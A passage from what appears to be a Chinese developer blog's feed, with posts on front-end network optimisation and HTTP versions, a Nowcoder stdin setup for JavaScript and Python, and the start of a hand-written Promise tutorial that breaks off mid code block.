class="keyword">if</span> (xhr.status === <span class="number">200</span> &amp;&amp; xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">        resolve(<span class="built_in">JSON</span>.parse(xhr.responseText))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">;(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cache_data = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;cache-data&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (cache_data) &#123;</span><br><span class="line">    cache_data = <span class="built_in">JSON</span>.parse(cache_data)</span><br><span class="line">    <span class="keyword">if</span> (+<span class="keyword">new</span> <span class="built_in">Date</span>() - cache_data.time &lt;= <span class="number">10000</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="keyword">await</span> getData()</span><br><span class="line">  <span class="built_in">localStorage</span>.setItem(</span><br><span class="line">    <span class="string">&#x27;cache-data&#x27;</span>,</span><br><span class="line">    <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">      time: +<span class="keyword">new</span> <span class="built_in">Date</span>(),</span><br><span class="line">      data: result,</span><br><span class="line">    &#125;)</span><br><span class="line">  )</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="DNS-解析"><a href="#DNS-解析" class="headerlink" title="DNS 解析"></a>DNS 解析</h3><ul><li>递归查询</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/DNS%E8%A7%A3%E6%9E%90-%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2.jpg"></p><ul><li>迭代查询</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/DNS%E8%A7%A3%E6%9E%90-%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2.jpg"></p><p>多服务器部署</p><ul><li>弊端：增加了 DNS 解析次数</li><li>优势：资源合理利用、抗压能力增强、提高 HTTP 并发性【同源并发 HTTP 5~7 个】</li></ul><p>每一次 DNS 解析时间预计在 20~120 毫秒</p><ul><li>减少 DNS 请求次数</li><li>DNS 预获取（DNS Prefetch）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;x-dns-prefetch-control&quot;</span> content=<span class="string">&quot;on&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;dns-prefetch&quot;</span> href=<span class="string">&quot;//static.360buyimg.com&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h3><ul><li>seq 序号，用来标识从 TCP 源端向目的端发送的字节流，发起方发送数据时对此进行标记</li><li>ack 确认序号，只有 ACK 标识为 1 时，确认序号字段才有效，ack=seq+1</li><li>标识位<ul><li>ACK：确认序号有效（acknowledge）</li><li>RST：重置连接 （reset）</li><li>SYN：发起一个新连接（synchronous）</li><li>FIN：释放一个新连接（finish）</li><li>seq：序号（sequence）</li></ul></li></ul><p><img data-src="https://img-blog.csdnimg.cn/20200430211404285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70#pic_center" alt="三次握手"></p><p>TCP 三次握手通俗理解，C→S：在不在，S→C：我在你在不在，C→S：我在</p><p><strong>三次握手为什么不用两次或四次？</strong></p><ul><li>TCP 作为一种可靠传输控制协议，其核心思想： <strong>既要保证数据可靠传输，又要提高传输的效率</strong></li><li>两次握手只能保证客户端给服务器端的信息收到了，不能保证服务端给客户端的信息收到了（不够稳定）</li><li>四次握手就多余了，因为服务端已经知道客户端收到信息了，再给客户端发信息就没有意义了</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/OSI%20TCP.png"></p><p>UDP(User Datagram Protocol) 连接没有三次握手机制</p><ol><li>相对于 TCP 来讲快</li><li>不稳定可靠</li></ol><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>HTTP 报文</p><ul><li>请求报文</li><li>响应报文</li></ul><p>响应状态码</p><ul><li>200 OK：请求已成功</li><li>202 Accepted：服务器已接受请求，但尚未处理（异步）</li><li>204 No Content：服务器成功处理了请求，但不需要返回任何实体内容</li><li>301 Moved Permanently：永久重定向</li><li>302 Move Temporarily：临时重定向</li><li>304 Not Modified：文档内容没有改变，走协商缓存</li><li>400 Bad Request : 请求参数有误</li><li>401 Unauthorized：请求需要权限验证</li><li>404 Not Found：请求失败，服务器没有这个资源</li><li>405 Method Not Allowed：请求方法不能由于请求相应资源</li><li>500 Internal Server Error：服务器未知错误</li><li>502 Bad Gateway：网关有误</li><li>503 Service Unavailable：服务器维护或过载，无法处理请求</li></ul><h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a>TCP 四次挥手</h3><p>服务受到信息和标识后</p><ol><li>准备客户端需要的东西【需要时间】</li><li>把信息返回给客户端</li></ol><p>但是为了保证消息的及时反馈，此时需要立即告诉客户端：我收到你的东西了，我现在开始准备等我一会</p><p><img data-src="https://img-blog.csdnimg.cn/20200430211431423.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg5Mzk1,size_16,color_FFFFFF,t_70#pic_center" alt="四次握手"></p><p>TCP 四次挥手通俗理解，C→S：我要走了，S→C：等下，我看看还有没有数据要传输，C→S：好了，没事了，挂了吧（已经挂了），C→S：挂了</p><p><strong>为什么连接的时候是三次握手，关闭的时候却是四次挥手？</strong></p><ul><li>服务端收到客户端的 SYN 连接请求，可以直接发送 SYN+ACK 报文</li><li>但关闭连接时，当服务器收到 FIN 报文时，很可能并不会立即关闭连接，所以只能先回复以一个 ACK 报文，告诉客户端：你发的 FIN 报文我收到了，只有等到服务端所有的报文都发送完了，才能发送 FIN 报文，因此不能一起发送，故需要四次握手</li></ul><p><strong>为了减少 TCP 握手和挥手的时间，一般都使用 <code>Connection: keep-alive</code></strong></p><p>数据请求：</p><ul><li>长轮询：设置定时器，每隔多久发送一次请求，拿到最新数据</li><li>长连接：如果数据没有更新则连接不中断（服务器挂起），监听数据改变</li></ul><h3 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h3><h2 id="性能优化汇总"><a href="#性能优化汇总" class="headerlink" title="性能优化汇总"></a>性能优化汇总</h2><ol><li><p>利用缓存</p><ul><li>对于静态资源文件实现强缓存和协商缓存（扩展：文件有更新，如何保证及时刷新？）</li><li>对于不经常更新的接口数据采用本地存储做数据缓存（扩展：cookie / localStorage / vuex|redux 区别？）</li></ul></li><li><p>DNS 优化</p><ul><li>分服务器部署，增加 HTTP 并发性（导致 DNS 解析变慢）</li><li>DNS Prefetch</li></ul></li><li><p>TCP 的三次握手和四次挥手</p><ul><li>Connection: keep-alive</li></ul></li><li><p>数据传输</p><ul><li><p>减少数据传输的大小</p><p>内容或者数据压缩（webpack 等）</p><p>服务器端一定要开启 GZIP 压缩（一般能压缩 60%左右）</p><p>大批量数据分批次请求（例如：下拉刷新或者分页，保证首次加载请求数据少）</p></li><li><p>减少 HTTP 请求的次数</p><p>资源文件合并处理</p><p>字体图标</p><p>雪碧图 CSS-Sprit</p><p>图片的 BASE64</p></li></ul></li><li><p>CDN 服务器“地域分布式“</p></li><li><p>采用 HTTP2.0</p></li></ol><p>网络优化是前端性能优化的中的重点内容，因为大部分的消耗都发生在网络层，尤其是第一次页面加载，如何减少等待时间很重要“减少白屏的效果和时间”</p><ul><li>loading 人性化体验</li><li>骨架屏：客户端骨屏 + 服务器骨架屏</li><li>图片延迟加载</li></ul><h2 id="HTTP1-0-VS-HTTP1-1-VS-HTTP2-0"><a href="#HTTP1-0-VS-HTTP1-1-VS-HTTP2-0" class="headerlink" title="HTTP1.0 VS HTTP1.1 VS HTTP2.0"></a>HTTP1.0 VS HTTP1.1 VS HTTP2.0</h2><h3 id="HTTP1-0-VS-HTTP1-1-区别："><a href="#HTTP1-0-VS-HTTP1-1-区别：" class="headerlink" title="HTTP1.0 VS HTTP1.1 区别："></a>HTTP1.0 VS HTTP1.1 区别：</h3><ul><li><strong>缓存处理：</strong> HTTP1.0 中主要使用 Last-Modified、Expires 来做缓存判断标准，HTTP1.1 则引入了更多的缓存控制策略：ETag、Cache-Control…</li><li><strong>带宽优化及网络连接的使用：</strong> HTTP1.1 支持断点续传，即返回码是 206（Partial Content）</li><li><strong>长连接：</strong> HTTP1.1 中默认开启 <code>Connection: keep-alive</code>，一定程度上弥补了 HTTP1.0 每次请求都要创建连接的缺点</li><li><strong>错误通知的管理：</strong> 在 HTTP1.1 中新增了 24 个错误状态响应码，如 409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除…</li><li><strong>Host 头处理：</strong> 在 HTTP1.0 中认为每台服务器都绑定一个唯一的 IP 地址，因此，请求消息中的 URL 并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个 IP 地址。HTTP1.1 的请求消息和响应消息都应支持 Host 头域，且请求消息中如果没有 Host 头域会报告一个错误（400 Bad Request）</li></ul><h3 id="HTTP2-0-VS-HTTP1-x-的新特性："><a href="#HTTP2-0-VS-HTTP1-x-的新特性：" class="headerlink" title="HTTP2.0 VS HTTP1.x 的新特性："></a>HTTP2.0 VS HTTP1.x 的新特性：</h3><ul><li><p><strong>新的二进制格式（Binary Format）：</strong> HTTP1.x 的解析是基于文本，基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认 0 和 1 的组合，基于这种考虑 HTTP2.0 的协议解析决定采用二进制格式，实现方便且健壮</p></li><li><p><strong>header 压缩：</strong> HTTP1.x 的 header 带有大量信息，而且每次都要重复发送，HTTP2.0 使用 encoder 来减少需要传输的 header 大小，通讯双方各自 cache 一份 header fields 表，既避免了重复 header 的传输，又减小了需要传输的大小</p></li><li><p><strong>服务端推送（server push）：</strong> 例如我的网页有一个 sytle.css 的请求，在客户端收到 sytle.css 数据的同时，服务端会将 sytle.js 的文件推送给客户端，当客户端再次尝试获取 sytle.js 时就可以直接从缓存中获取到，不用再发请求了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link: <span class="tag">&lt;/<span class="name">styles.css</span>&gt;</span>; rel=preload; as=style, <span class="tag">&lt;/<span class="name">example.png</span>&gt;</span>; rel=preload; as=image</span><br></pre></td></tr></table></figure></li><li><p><strong>多路复用（MultiPlexing）</strong></p><p>HTTP/1.0 每次请求响应，建立一个 TCP 连接，用完关闭</p><p>HTTP/1.1 「长连接」 若干个请求排队串行化单线程处理，后面的请求等待前面请求的返回才能获得执行机会，一旦有某请求超时等，后续请求只能被阻塞，毫无办法，也就是人们常说的线头阻塞；</p><p>HTTP/2.0 「多路复用」多个请求可同时在一个连接上并行执行，某个请求任务耗时严重，不会影响到其它连接的正常执行；</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;客户端和服务端之间的信息通信&quot;&gt;&lt;a href=&quot;#客户端和服务端之间的信息通信&quot; class=&quot;headerlink&quot; title=&quot;客户端和服务端之间的信息通信&quot;&gt;&lt;/a&gt;客户端和服务端之间的信息通信&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ajax / fetch 数据交互&lt;/li&gt;
&lt;li&gt;跨域处理方案：ajax、fetch、jsonp、postMessage&lt;/li&gt;
&lt;li&gt;资源获取【html|、css、js、image、音视频】&lt;/li&gt;
&lt;li&gt;webscoket&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="网络" scheme="http://llmysnow.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="HTTP网络层" scheme="http://llmysnow.top/tags/HTTP%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
    
    <category term="优化" scheme="http://llmysnow.top/tags/%E4%BC%98%E5%8C%96/"/>
    
    <category term="HTTP通信" scheme="http://llmysnow.top/tags/HTTP%E9%80%9A%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>牛客网本地刷题环境部署</title>
    <link href="http://llmysnow.top/posts/bf596df5/"/>
    <id>http://llmysnow.top/posts/bf596df5/</id>
    <published>2021-08-30T02:30:08.611Z</published>
    <updated>2021-08-30T02:30:08.611Z</updated>
    
    <content type="html"><![CDATA[<p>牛客网在线判题系统使用帮助：<a href="https://www.nowcoder.com/discuss/276">https://www.nowcoder.com/discuss/276</a></p><a id="more"></a><h2 id="JavaScript输入"><a href="#JavaScript输入" class="headerlink" title="JavaScript输入"></a>JavaScript输入</h2><p>【node.js】readline (逐行读取)：<a href="https://www.cnblogs.com/yujihang/p/7414169.html">https://www.cnblogs.com/yujihang/p/7414169.html</a></p><p>Javascript本地测试/笔试环境搭建：<a href="https://react.ctolib.com/wuyve-Javascript-test.html">https://react.ctolib.com/wuyve-Javascript-test.html</a></p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><ol><li><p>在代码处的文件夹 输入  <code>cnpm install readline-sync</code></p></li><li><p>在代码处的文件夹 添加一个JS文件，文件头部输入以下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __readline = <span class="built_in">require</span>(<span class="string">&#x27;readline-sync&#x27;</span>);</span><br><span class="line">__readline.setDefaultOptions(&#123;</span><br><span class="line">    prompt: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> read_line = __readline.prompt;</span><br><span class="line"><span class="keyword">var</span> print = <span class="built_in">console</span>.log;</span><br></pre></td></tr></table></figure></li><li><p>这样子，JS带输入输出就OK了</p></li></ol><h3 id="JavaScript-V8"><a href="#JavaScript-V8" class="headerlink" title="JavaScript(V8)"></a>JavaScript(V8)</h3><p>单行输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __readline = <span class="built_in">require</span>(<span class="string">&#x27;readline-sync&#x27;</span>);</span><br><span class="line">__readline.setDefaultOptions(&#123;</span><br><span class="line">    prompt: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> read_line = __readline.prompt;</span><br><span class="line"><span class="keyword">var</span> print = <span class="built_in">console</span>.log;</span><br><span class="line"></span><br><span class="line"><span class="comment">//牛客网：readline</span></span><br><span class="line"><span class="comment">//赛码：read_line</span></span><br><span class="line"><span class="keyword">while</span>(line=read_line())&#123;</span><br><span class="line">    <span class="keyword">var</span> lines = line.split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">parseInt</span>(lines[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">parseInt</span>(lines[<span class="number">1</span>]);</span><br><span class="line">    print(a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多行输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __readline = <span class="built_in">require</span>(<span class="string">&#x27;readline-sync&#x27;</span>);</span><br><span class="line">__readline.setDefaultOptions(&#123;</span><br><span class="line">    prompt: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> read_line = __readline.prompt;</span><br><span class="line"><span class="keyword">var</span> print = <span class="built_in">console</span>.log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> countLine = <span class="built_in">parseInt</span>(read_line());</span><br><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; countLine; i++) &#123;</span><br><span class="line">    lines = read_line().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; lines.length; j++) &#123;</span><br><span class="line">        sum += <span class="built_in">parseInt</span>(lines[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    print(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JavaScript-Node"><a href="#JavaScript-Node" class="headerlink" title="JavaScript(Node)"></a>JavaScript(Node)</h3><p>单行输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> rl = readline.createInterface(&#123;</span><br><span class="line">    input: process.stdin,</span><br><span class="line">    output: process.stdout</span><br><span class="line">&#125;);</span><br><span class="line">rl.on(<span class="string">&#x27;line&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">line</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// 注意：这里的line不论在shell中输入的是数字还是字符串，获取到的始终是字符串</span></span><br><span class="line">    <span class="keyword">var</span> tokens = line.split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">parseInt</span>(tokens[<span class="number">0</span>]) + <span class="built_in">parseInt</span>(tokens[<span class="number">1</span>]));</span><br><span class="line">    <span class="comment">// 关闭node输入环境</span></span><br><span class="line">    rl.close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>多行输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> print = <span class="built_in">console</span>.log;</span><br><span class="line"><span class="keyword">var</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> rl = readline.createInterface(&#123;</span><br><span class="line">    input: process.stdin,</span><br><span class="line">    output: process.stdout</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> countLine = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">rl.on(<span class="string">&#x27;line&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">line</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> lines = line.split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lines.length; i++) &#123;</span><br><span class="line">        sum += <span class="built_in">parseInt</span>(lines[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    index++;</span><br><span class="line">    <span class="keyword">if</span> (index == countLine) &#123;</span><br><span class="line">        print(sum);</span><br><span class="line">        <span class="comment">// 关闭node输入环境</span></span><br><span class="line">        rl.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">rl.on(<span class="string">&#x27;close&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    process.exit(<span class="number">0</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Python输入"><a href="#Python输入" class="headerlink" title="Python输入"></a>Python输入</h2><p>Python常用标准库之sys：<a href="https://www.jianshu.com/p/c1831232c391">https://www.jianshu.com/p/c1831232c391</a></p><h3 id="python-2"><a href="#python-2" class="headerlink" title="python 2+"></a>python 2+</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = sys.stdin.readline().strip()</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lines = line.split()</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">int</span>(lines[<span class="number">0</span>]) + <span class="built_in">int</span>(lines[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="python-3"><a href="#python-3" class="headerlink" title="python 3+"></a>python 3+</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin:</span><br><span class="line">    a = line.split()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="built_in">int</span>(a[<span class="number">0</span>]) + <span class="built_in">int</span>(a[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;牛客网在线判题系统使用帮助：&lt;a href=&quot;https://www.nowcoder.com/discuss/276&quot;&gt;https://www.nowcoder.com/discuss/276&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="基础配置" scheme="http://llmysnow.top/categories/%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="Python" scheme="http://llmysnow.top/tags/Python/"/>
    
    <category term="牛客网" scheme="http://llmysnow.top/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>手撕 Promise（内附then链实现）</title>
    <link href="http://llmysnow.top/posts/c7bac255/"/>
    <id>http://llmysnow.top/posts/c7bac255/</id>
    <published>2021-08-30T02:30:08.610Z</published>
    <updated>2021-08-30T02:30:08.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><h3 id="了解-Promise"><a href="#了解-Promise" class="headerlink" title="了解  Promise"></a>了解  Promise</h3><p>Promise 是一个异步操作返回的对象，用来传递异步操作的消息</p><p><strong>可以解决的问题</strong></p><ol><li>解决回调地狱问题，不会导致难以维护</li><li>合并多个异步请求，节约时间</li></ol><a id="more"></a><p><strong>Promise 的三种状态</strong></p><ol><li>Pending 等待态</li><li>Fulfilled 成功态</li><li>Rejected 失败态</li></ol><h3 id="使用-Promise"><a href="#使用-Promise" class="headerlink" title="使用 Promise"></a>使用 Promise</h3><p><strong>Promise.resolve：将现有对象转为 Promise 对象，这个对象处于 resolve 状态</strong></p><p>作用：</p><ul><li>改状态</li><li>发布事件池子里的方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p><strong>Promise.reject：将现有对象转为 Promise 对象，这个对象处于 reject 状态</strong></p><p>作用：</p><ul><li>改状态</li><li>发布事件池子里的方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.reject([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]).then(<span class="literal">null</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p><strong>Promise.then：用来指定 Promise 对象的状态改变时要执行的操作</strong></p><ul><li>then 是同步的，then 里的回调函数是异步的</li></ul><p><strong>注意几点：</strong></p><ul><li>如果当前 then 中回调函数的执行结果是一个 Promise 实例，那当前这个实例的状态会接管下一个 then 中回调函数的执行</li><li>如果当前的 then 中的回调函数执行结果不是一个 Promise 实例，那下一个then中会默认执行成功的回调函数</li><li>当 Promise 的回调函数执行的时候出现了错误，那当前的实例会变成失败态</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    resolve(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="comment">//reject(&#x27;fail&#x27;);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;data：&quot;</span>, data);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;err：&quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>Promise.all：接收一个数组，数组内是 Promise 实例。必须全部成功才表示成功</strong></p><p><strong>Promise.race：接收一个数组，数组内是 Promise 实例。最早返回的对象成功，就变成成功态；如果失败了，就变成失败态</strong></p><h2 id="封装-Promise"><a href="#封装-Promise" class="headerlink" title="封装 Promise"></a>封装 Promise</h2><p>Promise 是一个 ES6 的内置类</p><ul><li>当 new Promise 的时候，会给当前实例增加状态（默认是 pending 等待态）和两个事件池（成功和失败的事件池）</li><li>还会给 Promise 的内部传递一个 executor 函数，此函数会立即执行，而且此函数会传递两个形参函数 resolve 和 reject，形参对应的实参函数在 Promise 内部，当执行任何一个函数的时候，都会做两件事<ol><li>去改变当前 Promise 实例的状态（<strong>改状态</strong>）</li><li><strong>发布对应池子里的事件</strong></li></ol></li><li>Promise 的类的原型上还有一个 then 方法，用来给当前的 Promise 实例的事件池子订阅方法，而且还会返回一个新的 Promise 实例</li></ul><h3 id="不考虑-then-链式调用"><a href="#不考虑-then-链式调用" class="headerlink" title="不考虑 then 链式调用"></a>不考虑 then 链式调用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 